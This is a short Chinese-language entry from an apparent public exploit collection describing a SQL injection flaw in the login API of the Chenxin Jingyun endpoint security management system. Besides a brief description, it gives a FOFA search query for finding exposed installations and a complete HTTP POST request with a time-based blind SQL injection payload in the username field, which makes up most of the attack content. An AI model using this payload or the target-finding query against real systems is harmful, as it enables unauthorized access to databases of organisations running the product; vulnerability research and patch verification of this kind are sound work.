---
fofa: "app="
source: "wy876 漏洞文库"
---

# 辰信景云终端安全管理系统 login 存在SQL注入漏洞

# 一、漏洞简介
<font style="color:rgb(34, 34, 34);">辰信景云终端安全管理系统是辰信领创推出的新一代企业级反病毒安全防护软件， 为企业提供了一套专业可信赖的全方位终端安全解决方案。辰信景云终端安全管理系统 login 存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。</font>

# <font style="color:rgb(34, 34, 34);">二、影响版本</font>
+ <font style="color:rgb(34, 34, 34);">辰信景云终端安全管理系统</font>

# <font style="color:rgb(34, 34, 34);">三、资产测绘</font>
+ fofa`app="辰信领创-景云终端安全管理系统"`
+ 特征


# 四、漏洞复习
```plain
POST /api/user/login HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 102

captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mdnxgki42lxoaomn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
